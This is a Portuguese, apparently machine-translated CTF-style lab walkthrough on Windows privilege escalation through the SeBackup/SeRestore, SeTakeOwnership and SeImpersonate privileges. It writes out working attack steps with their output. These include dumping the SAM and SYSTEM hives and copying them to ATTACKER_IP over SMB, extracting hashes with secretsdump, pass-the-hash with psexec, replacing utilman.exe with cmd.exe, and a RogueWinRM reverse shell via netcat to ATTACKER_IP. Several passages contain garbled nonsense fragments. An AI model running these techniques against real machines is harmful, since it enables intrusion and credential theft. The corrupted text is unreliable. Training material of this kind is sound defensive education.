---
tags:
  - EXPLOITATION
  - Windows
---
# Backup / Restauração

Os privilégios SeBackup e SeRestore permitem que os usuários leiam e escrevam para qualquer arquivo no sistema, ignorando qualquer DACL no lugar. A ideia por trás desse privilégio é permitir que certos usuários realizem backups de um sistema sem exigir privilégios administrativos completos.

Tendo esse poder, um atacante pode trivialmente escalar privilégios no sistema usando muitas técnicas. O que vamos olhar consiste em copiar as colmeias de registro SAM e SYSTEM para extrair o hash de senha do administrador local.

Uma vez no prompt de comando, podemos verificar nossos privilégios com o seguinte comando:
Prompt de comando

```powershell
C:\> whoami /priv
```

# Informação de Privilégios

Para fazer backup dos hashes SAM e SYSTEM, podemos usar os seguintes comandos:
Prompt de comando

```powershell
C:\> reg save hklm\system C:\Users\THMBackup\system.hive
The operation completed successfully.

C:\> reg save hklm\sam C:\Users\THMBackup\sam.hive
The operation completed successfully.
```

Isso criará alguns arquivos com o conteúdo do registro. Agora podemos copiar esses arquivos para nossa máquina de invasores usando SMB ou qualquer outro método disponível. Para SMB, podemos usar o impacket's smbserver.py para iniciar um servidor SMB simples com um compartilhamento de rede no diretório atual do nosso AttackBox:
Kali Linux em inglês

```shell
user@attackerpc$ mkdir share
user@attackerpc$ python3.9 /opt/impacket/examples/smbserver.py -smb2support -username THMBackup -password CopyMaster555 public share
```

Isso criará uma partilha nomeada publicapontando para o sharediretório, que requer o nome de usuário e senha da nossa sessão atual do Windows. Depois disso, podemos usar o copycomando em nossa máquina Windows para transferir ambos os arquivos para o nosso AttackBox:
Prompt de comando

```shell
C:\> copy C:\Users\THMBackup\sam.hive \\ATTACKER_IP\public\
C:\> copy C:\Users\THMBackup\system.hive \\ATTACKER_IP\public\
```

E use impacket para recuperar hashes de senha dos usuários:
Kali Linux em inglês

user@attackerpc$ python3.9 /opt/impacket/examples/secretsdump.py -sam sam.hive -system system.hive LOCAL
Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation

[*] Target system bootKey: 0x36c8d26ec0df8b23ce63bcefa6e2d821
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:13a04cdcf3f7ec41264e568127c5ca94:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::


        

Finalmente podemos usar o hash do administrador para realizar um ataque Pass-the-Hash e obter acesso à máquina de destino com privilégios SYSTEM:
Kali Linux em inglês

user@attackerpc$ python3.9 /opt/impacket/examples/psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:13a04cdcf3f7ec41264e568127c5ca94 administrator@MACHINE_IP
Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation

[*] Requesting shares on 10.10.175.90.....
[*] Found writable share ADMIN$
[*] Uploading file nfhtabqO.exe
[*] Opening SVCManager on 10.10.175.90.....
[*] Creating service RoLE on 10.10.175.90.....
[*] Starting service RoLE.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system
        


SeTakeOwnershipTradução

O privilégio SeTakeOwnership permite que um usuário se aproprie de qualquer objeto no sistema, incluindo arquivos e chaves de registro, abrindo muitas possibilidades para um invasor elevar privilégios, como poderíamos, por exemplo, procurar um serviço em execução como SISTEMA e assumir a propriedade do executável do serviço. Para esta tarefa, estaremos tomando um caminho diferente, no entanto.

Faça login na máquina de destino via RDP usando as seguintes credenciais:

O usuário: THMTakeOwnership

Senha: TheWorldIsMine2022

Para obter o privilégio SeTakeOwnership, precisamos abrir um prompt de comando usando a opção "Abrir como administrador". Nós seremos solicitados a inserir nossa senha para obter um console elevado:

Run as admin

Uma vez no prompt de comando, podemos verificar nossos privilégios com o seguinte comando:
Prompt de comando

C:\> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                              State
============================= ======================================== ========
SeTakeOwnershipPrivilege      Take ownership of files or other objects Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                 Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set           Disabled

        

Nós vamos abusar utilman.exepara escalar os privilégios desta vez. Utilman é um aplicativo Windows integrado usado para fornecer opções de facilidade de acesso durante a tela de bloqueio:

utilman normal behaviour

Como o Utilman é executado com privilégios SYSTEM, efetivamente ganharemos privilégios SYSTEM se substituirmos o binário original para qualquer carga útil que quisermos. Como podemos nos apropriar de qualquer arquivo, substituí-lo é trivial.

Para substituir o utilman, começaremos por tomar posse dele com o seguinte comando:
Prompt de comando

C:\> takeown /f C:\Windows\System32\Utilman.exe

SUCCESS: The file (or folder): "C:\Windows\System32\Utilman.exe" now owned by user "WINPRIVESC2\thmtakeownership".

        

Observe que ser o proprietário de um arquivo não significa necessariamente que você tem privilégios sobre ele, mas sendo o proprietário você pode atribuir a si mesmo quaisquer privilégios que você precisa. Para dar ao seu usuário permissões completas sobre utilman.exe, você pode usar o seguinte comando:
Prompt de comando

C:\> icacls C:\Windows\System32\Utilman.exe /grant THMTakeOwnership:F
processed file: Utilman.exe
Successfully processed 1 files; Failed processing 0 files

        

Depois disso, substituiremos utilman.exe por uma cópia do cmd.exe:
Prompt de comando

C:\Windows\System32\> copy cmd.exe utilman.exe
        1 file(s) copied.

        

Para acionar o utilman, vamos bloquear a tela a partir do botão de início:

lock screen

E, finalmente, clique no botão "Ease of Access", que executa utilman.exe com privilégios SYSTEM. Uma vez que o substituímos por uma cópia cmd.exe, obteremos um prompt de comando com privilégios SYSTEM:

utilman shell


SeImpersonate / SeAssignPrimaryTokenTradução

Esses privilégios permitem que um processo se faça passar por outros usuários e aja em seu nome. A representação geralmente consiste em ser capaz de gerar um processo ou thread sob o contexto de segurança de outro usuário.

A representação é facilmente compreendida quando você pensa em como funciona um servidor FTP. O servidor FTP deve restringir os usuários a acessar apenas os arquivos que eles devem permitir ver.

Vamos supor que temos um serviço de FTP em execução com o usuário ftp- A . (í a questão: es. , , , íntepeo. . E. . es. sobre a questão . (em, proprio, e os comandos e. . sobre a questão , , . Sem personificação, se o usuário Ann entrar no servidor FTP e tentar acessar seus arquivos, o serviço FTP tentará acessá-los com seu token de acesso em vez de Ann:


Existem várias razões pelas quais o uso do token ftp não é a melhor ideia: - Para que os arquivos sejam servidos corretamente, eles precisariam ser acessíveis ao ftpusuário. No exemplo acima, o serviço FTP seria capaz de acessar os arquivos de Ann, mas não os arquivos de Bill, como o DACL nos arquivos de Bill não permite o usuário ftp- A . (í a , , , , , ínte , . Isso adiciona complexidade, pois devemos configurar manualmente permissões específicas para cada arquivo/diretório servido. - Para o sistema operacional, todos os arquivos são acessados pelo usuário ftp, independente do qual o usuário está atualmente conectado ao serviço FTP. Isso torna impossível delegar a autorização ao sistema operacional; portanto, o serviço FTP deve implementá-lo. - Se o serviço FTP fosse comprometido em algum momento, o invasor teria acesso imediato a todas as pastas às quais ftpO usuário tem acesso.

Se, por outro lado, o usuário do serviço FTP tiver o privilégio SeImpersonate ou SeAssignPrimaryToken, tudo isso é simplificado um pouco, pois o serviço FTP pode acessar temporariamente o token de acesso do usuário fazendo login e usá-lo para executar qualquer tarefa em seu nome:


Agora, se o usuário Ann faz login no serviço FTP e dado que o usuário ftp tem privilégios de personificação, ele pode emprestar o token de acesso de Ann e usá-lo para acessar seus arquivos. Desta forma, os arquivos não precisam fornecer acesso ao usuário ftp de qualquer forma, e o sistema operacional trata de autorização. Como o serviço FTP está se passando por Ann, ele não poderá acessar os arquivos do Jude ou do Bill durante essa sessão.

Como atacantes, se conseguirmos assumir o controle de um processo com privilégios SeImpersonate ou SeAssignPrimaryToken, podemos personificar qualquer usuário conectando e autenticado a esse processo.

Nos sistemas Windows, você descobrirá que as CONTAS de ATENDIMENTO LOCAL e NETWORK SERVICE já têm esses privilégios. Como essas contas são usadas para gerar serviços usando contas restritas, faz sentido permitir que elas se passem por você se conectando usuários se o serviço precisar. O Internet Information Services (IIS) também criará uma conta padrão semelhante chamada "iis apppool-defaultapppool" para aplicativos da Web.

Para elevar os privilégios usando essas contas, um invasor precisa do seguinte: 1. Para gerar um processo para que os usuários possam se conectar e autenticar a ele para que a personificação ocorra. 2. Encontre uma maneira de forçar usuários privilegiados a se conectarem e autenticarem ao processo malicioso gerado.

Vamos usar o exploit RogueWinRM para realizar ambas as condições.

Vamos começar assumindo que já comprometemos um site em execução no IIS e que plantamos um shell web no seguinte endereço:

http://MACHINE_IP/

Podemos usar o web shell para verificar os privilégios atribuídos da conta comprometida e confirmar que temos os dois privilégios de interesse para esta tarefa:

Webshell impersonate privileges

Para usar o RogueWinRM, primeiro precisamos carregar o exploit para a máquina de destino. Para sua conveniência, isso já foi feito, e você pode encontrar o exploit no C:\tools\Pasta.

A exploração RogueWinRM é possível porque sempre que um usuário (incluindo usuários não privilegiados) inicia o serviço BITS no Windows, ele cria automaticamente uma conexão à porta 5985 usando privilégios SISTEMA. A porta 5985 é normalmente usada para o serviço WinRM, que é simplesmente uma porta que expõe um console Powershell a ser usado remotamente através da rede. Pense nisso como SSH, mas usando Powershell.

Se, por algum motivo, o serviço WinRM não estiver sendo executado no servidor da vítima, um invasor pode iniciar um serviço WinRM falso na porta 5985 e pegar a tentativa de autenticação feita pelo serviço BITS ao iniciar. Se o atacante tiver privilégios de SeImpersonate, ele poderá executar qualquer comando em nome do usuário de conexão, que é SISTEMA.

Antes de executar o exploit, vamos iniciar um ouvinte netcat para receber um shell reverso na máquina do nosso atacante:
Kali Linux em Inglês

user@attackerpc$ nc -lvp 4442


E, em seguida, use nosso shell web para acionar o exploit RogueWinRM usando o seguinte comando:

c:\tools\RogueWinRM\RogueWinRM.exe -p "C:\tools\nc64.exe" -a "-e cmd.exe ATTACKER_IP 4442"

RogueWinRM exploit execution

Nota: A exploração pode levar até 2 minutos para funcionar, então o seu navegador pode parecer sem resposta por um pouco. Isso acontece se você executar o exploit várias vezes, pois ele deve esperar que o serviço BITS pare antes de inicá-lo novamente. O serviço BITS irá parar automaticamente após 2 minutos de partida.

O que é -pparâmetro especifica o executável a ser executado pelo exploit, que é nc64.exeNeste caso. O que é -aparâmetro é usado para passar argumentos para o executável. Uma vez que queremos que o nc64 estabeleça um shell reverso contra a nossa máquina atacante, os argumentos para passar para o netcat serão -e cmd.exe ATTACKER_IP 4442- A . (í a questão: es. , , , íntepeo. . E. . es. sobre a questão . (em, proprio

Se tudo estiver configurado corretamente, você deve esperar um shell com privilégios SYSTEM:
Kali Linux em Inglês

user@attackerpc$ nc -lvp 4442
Listening on 0.0.0.0 4442
Connection received on 10.10.175.90 49755
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

c:\windows\system32\inetsrv>whoami
nt authority\system

Usando qualquer um dos três métodos discutidos nesta tarefa, obtenha acesso à área de trabalho do Administrador e colete a bandeira. Não se esqueça de inserir a bandeira no final desta tarefa.